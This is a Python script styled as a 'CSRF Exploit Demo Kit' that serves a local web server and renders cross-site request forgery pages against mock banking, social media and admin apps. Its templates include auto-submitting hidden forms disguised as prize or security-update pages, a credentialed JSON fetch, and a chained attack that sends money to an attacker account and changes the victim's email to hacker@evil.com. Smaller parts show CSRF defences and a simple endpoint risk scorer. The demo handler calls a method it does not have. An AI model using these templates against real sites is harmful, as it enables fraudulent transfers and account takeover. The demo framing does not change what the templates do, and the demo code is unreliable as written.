#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
import threading
import time
import random
import string
from datetime import datetime
import webbrowser
import os
from jinja2 import Template
import base64

class CSRFDemoKit:
    def __init__(self, host='localhost', port=8000):
        self.host = host
        self.port = port
        self.vulnerable_apps = {}
        self.exploits = {}
        self.defenses = {}
        
        # Sample vulnerable applications data
        self._init_vulnerable_apps()
        self._init_exploits()
        self._init_defenses()
    
    def _init_vulnerable_apps(self):
        """Initialize sample vulnerable applications"""
        self.vulnerable_apps = {
            'banking': {
                'name': 'Simple Banking App',
                'endpoints': {
                    'transfer': {
                        'method': 'POST',
                        'url': '/transfer',
                        'params': {'to_account': '', 'amount': '', 'description': ''},
                        'csrf_protected': False
                    },
                    'change_email': {
                        'method': 'POST', 
                        'url': '/profile/email',
                        'params': {'new_email': ''},
                        'csrf_protected': False
                    }
                }
            },
            'social': {
                'name': 'Social Media App',
                'endpoints': {
                    'post_update': {
                        'method': 'POST',
                        'url': '/api/posts',
                        'params': {'content': '', 'privacy': 'public'},
                        'csrf_protected': True,
                        'token_name': 'csrf_token'
                    },
                    'change_password': {
                        'method': 'POST',
                        'url': '/account/password',
                        'params': {'current_password': '', 'new_password': ''},
                        'csrf_protected': True,
                        'token_name': 'authenticity_token'
                    }
                }
            },
            'admin': {
                'name': 'Admin Panel',
                'endpoints': {
                    'create_user': {
                        'method': 'POST',
                        'url': '/admin/users',
                        'params': {'username': '', 'role': 'admin', 'email': ''},
                        'csrf_protected': True,
                        'token_name': '_token'
                    }
                }
            }
        }
    
    def _init_exploits(self):
        """Initialize CSRF exploit templates"""
        self.exploits = {
            'basic_form': """
<html>
<head><title>Win a Free iPhone!</title></head>
<body>
<h1>Congratulations! You won an iPhone!</h1>
<p>Click below to claim your prize:</p>
<form id="csrfForm" action="{{ target_url }}" method="{{ method }}">
    {% for name, value in params.items() %}
    <input type="hidden" name="{{ name }}" value="{{ value }}">
    {% endfor %}
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
            """,
            
            'img_get': """
<html>
<head><title>Interesting Image</title></head>
<body>
<h1>Check out this amazing image!</h1>
<img src="{{ target_url }}?{{ params_query }}" onerror="alert('CSRF executed!')">
</body>
</html>
            """,
            
            'json_post': """
<html>
<head><title>API Demo</title></head>
<body>
<script>
fetch('{{ target_url }}', {
    method: '{{ method }}',
    headers: {
        'Content-Type': 'application/json',
    },
    credentials: 'include',
    body: JSON.stringify({{ params_json }})
});
</script>
<p>Loading your content...</p>
</body>
</html>
            """,
            
            'chained_attack': """
<html>
<head><title>Security Update Required</title></head>
<body>
<h1>Security Update</h1>
<p>Your account requires a security update. Please wait while we process...</p>
<script>
// Chain multiple CSRF attacks
const attacks = [
    {
        url: '{{ attack1_url }}',
        method: '{{ attack1_method }}',
        params: {{ attack1_params }}
    },
    {
        url: '{{ attack2_url }}', 
        method: '{{ attack2_method }}',
        params: {{ attack2_params }}
    }
];

async function executeAttacks() {
    for (let attack of attacks) {
        if (attack.method === 'GET') {
            await fetch(attack.url + '?' + new URLSearchParams(attack.params), {
                credentials: 'include'
            });
        } else {
            await fetch(attack.url, {
                method: attack.method,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                credentials: 'include',
                body: new URLSearchParams(attack.params)
            });
        }
    }
    alert('Security update complete!');
}

executeAttacks();
</script>
</body>
</html>
            """
        }
    
    def _init_defenses(self):
        """Initialize CSRF defense implementations"""
        self.defenses = {
            'csrf_tokens': """
// CSRF Token Implementation
function generateCSRFToken() {
    return '{{ token }}'; // In real implementation, use cryptographically secure random
}

function validateCSRFToken(token) {
    return token === '{{ expected_token }}';
}
            """,
            'same_site_cookies': """
// Set SameSite cookie attribute
document.cookie = "session=abc123; SameSite=Strict; Secure";
            """,
            'custom_headers': """
// Require custom headers for state-changing requests
function addCSRFHeader(xhr) {
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    xhr.setRequestHeader('X-CSRF-Token', '{{ token }}');
}
            """
        }
    
    def generate_exploit(self, app_name, endpoint_name, attack_type='basic_form', **kwargs):
        """Generate CSRF exploit HTML"""
        if app_name not in self.vulnerable_apps:
            raise ValueError(f"Application '{app_name}' not found")
        
        app = self.vulnerable_apps[app_name]
        endpoint = app['endpoints'][endpoint_name]
        
        template_vars = {
            'target_url': f"http://{app_name}.local{endpoint['url']}",
            'method': endpoint['method'],
            'params': kwargs.get('params', {}),
            'app_name': app['name']
        }
        
        if attack_type == 'img_get' and endpoint['method'] == 'GET':
            template_vars['params_query'] = urllib.parse.urlencode(kwargs.get('params', {}))
        
        elif attack_type == 'json_post':
            template_vars['params_json'] = json.dumps(kwargs.get('params', {}))
        
        elif attack_type == 'chained_attack':
            # For chained attacks, we need multiple endpoints
            template_vars.update({
                'attack1_url': f"http://{app_name}.local{endpoint['url']}",
                'attack1_method': endpoint['method'],
                'attack1_params': kwargs.get('params', {}),
                'attack2_url': f"http://{app_name}.local{app['endpoints'][kwargs['chain_endpoint']]['url']}",
                'attack2_method': app['endpoints'][kwargs['chain_endpoint']]['method'],
                'attack2_params': kwargs.get('chain_params', {})
            })
        
        template = Template(self.exploits[attack_type])
        return template.render(**template_vars)
    
    def create_demo_server(self):
        """Create a demonstration web server"""
        class CSRFDemoHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = """
                    <html>
                    <head><title>CSRF Demo Kit</title></head>
                    <body>
                    <h1>CSRF Exploit Demo Kit</h1>
                    <h2>Available Demos:</h2>
                    <ul>
                    <li><a href="/demo/banking-transfer">Banking Transfer CSRF</a></li>
                    <li><a href="/demo/social-post">Social Media Post CSRF</a></li>
                    <li><a href="/demo/chained-attack">Chained CSRF Attack</a></li>
                    <li><a href="/demo/json-csrf">JSON CSRF</a></li>
                    <li><a href="/demo/defenses">CSRF Defenses</a></li>
                    </ul>
                    </body>
                    </html>
                    """
                    self.wfile.write(html.encode())
                
                elif self.path == '/demo/banking-transfer':
                    exploit_html = self.generate_exploit(
                        'banking', 'transfer', 'basic_form',
                        params={'to_account': 'attacker123', 'amount': '1000', 'description': 'CSRF Demo'}
                    )
                    self._serve_exploit(exploit_html, "Banking Transfer CSRF")
                
                elif self.path == '/demo/social-post':
                    exploit_html = self.generate_exploit(
                        'social', 'post_update', 'basic_form',
                        params={'content': 'I love this website! #CSRF', 'privacy': 'public'}
                    )
                    self._serve_exploit(exploit_html, "Social Media Post CSRF")
                
                elif self.path == '/demo/chained-attack':
                    exploit_html = self.generate_exploit(
                        'banking', 'transfer', 'chained_attack',
                        params={'to_account': 'attacker123', 'amount': '500', 'description': 'First transfer'},
                        chain_endpoint='change_email',
                        chain_params={'new_email': 'hacker@evil.com'}
                    )
                    self._serve_exploit(exploit_html, "Chained CSRF Attack")
                
                elif self.path == '/demo/json-csrf':
                    exploit_html = self.generate_exploit(
                        'social', 'post_update', 'json_post',
                        params={'content': 'JSON CSRF attack successful!', 'privacy': 'public'}
                    )
                    self._serve_exploit(exploit_html, "JSON CSRF Attack")
                
                elif self.path == '/demo/defenses':
                    self._serve_defenses_demo()
                
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def _serve_exploit(self, html, title):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                wrapped_html = f"""
                <html>
                <head><title>{title}</title></head>
                <body>
                <h1>{title}</h1>
                <div style="background: #f0f0f0; padding: 10px; margin: 10px;">
                <h3>Exploit Code:</h3>
                <pre>{html}</pre>
                </div>
                <hr>
                <h3>Attack Simulation:</h3>
                {html}
                </body>
                </html>
                """
                self.wfile.write(wrapped_html.encode())
            
            def _serve_defenses_demo(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html = """
                <html>
                <head><title>CSRF Defenses</title></head>
                <body>
                <h1>CSRF Defense Mechanisms</h1>
                
                <h2>1. CSRF Tokens</h2>
                <pre>
                // Server generates unique token per session
                const csrfToken = generateSecureToken();
                
                // Include token in forms
                &lt;input type="hidden" name="csrf_token" value=""" + base64.b64encode(b"secure_token_123").decode() + """&gt;
                
                // Validate token on server
                if (!validateCSRFToken(request.csrf_token)) {
                    return error("Invalid CSRF token");
                }
                </pre>
                
                <h2>2. SameSite Cookies</h2>
                <pre>
                Set-Cookie: session=abc123; SameSite=Strict; Secure
                </pre>
                
                <h2>3. Custom Headers</h2>
                <pre>
                // Require custom headers for state-changing requests
                fetch('/api/transfer', {
                    method: 'POST',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-CSRF-Token': 'token_here'
                    }
                });
                </pre>
                
                <h2>4. Double Submit Cookie</h2>
                <pre>
                // Set random token in cookie and form
                Cookie: csrf_token=random_value123
                Form: &lt;input type="hidden" name="csrf_token" value="random_value123"&gt;
                
                // Verify they match on server
                </pre>
                </body>
                </html>
                """
                self.wfile.write(html.encode())
        
        server = HTTPServer((self.host, self.port), CSRFDemoHandler)
        print(f"CSRF Demo Kit running at http://{self.host}:{self.port}")
        print("Press Ctrl+C to stop the server")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down CSRF Demo Kit")
            server.shutdown()

class AdvancedCSRFAnalyzer:
    def __init__(self):
        self.vulnerability_patterns = {
            'state_changing_endpoints': ['POST', 'PUT', 'DELETE', 'PATCH'],
            'dangerous_actions': ['transfer', 'delete', 'update', 'create', 'change', 'reset'],
            'token_indicators': ['csrf', 'token', 'authenticity', '_token', 'nonce']
        }
    
    def analyze_endpoint(self, method, path, params=None, headers=None):
        """Analyze endpoint for CSRF vulnerability"""
        risk_score = 0
        findings = []
        
        # Check if it's a state-changing method
        if method.upper() in self.vulnerability_patterns['state_changing_endpoints']:
            risk_score += 30
            findings.append("State-changing HTTP method detected")
        
        # Check for dangerous actions in path
        for action in self.vulnerability_patterns['dangerous_actions']:
            if action in path.lower():
                risk_score += 25
                findings.append(f"Dangerous action '{action}' detected in endpoint")
                break
        
        # Check for CSRF token presence
        has_csrf_protection = False
        if headers:
            for header in headers:
                if any(indicator in header.lower() for indicator in self.vulnerability_patterns['token_indicators']):
                    has_csrf_protection = True
                    break
        
        if params:
            for param in params:
                if any(indicator in param.lower() for indicator in self.vulnerability_patterns['token_indicators']):
                    has_csrf_protection = True
                    break
        
        if not has_csrf_protection:
            risk_score += 45
            findings.append("No CSRF protection mechanism detected")
        else:
            findings.append("CSRF protection mechanism detected")
        
        # Determine risk level
        if risk_score >= 70:
            risk_level = "HIGH"
        elif risk_score >= 40:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        return {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'findings': findings,
            'has_csrf_protection': has_csrf_protection
        }

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='CSRF Exploit Demo Kit')
    parser.add_argument('--host', default='localhost', help='Host to run demo server on')
    parser.add_argument('--port', type=int, default=8000, help='Port to run demo server on')
    parser.add_argument('--generate', help='Generate specific exploit')
    
    args = parser.parse_args()
    
    kit = CSRFDemoKit(host=args.host, port=args.port)
    
    if args.generate:
        # Generate specific exploit
        if args.generate == 'banking':
            exploit = kit.generate_exploit('banking', 'transfer', 
                                         params={'to_account': 'attacker', 'amount': '1000'})
            print("Banking CSRF Exploit Generated:")
            print(exploit)
        elif args.generate == 'social':
            exploit = kit.generate_exploit('social', 'post_update',
                                         params={'content': 'CSRF demo', 'privacy': 'public'})
            print("Social Media CSRF Exploit Generated:")
            print(exploit)
    else:
        # Start demo server
        kit.create_demo_server()

if __name__ == "__main__":
    main()
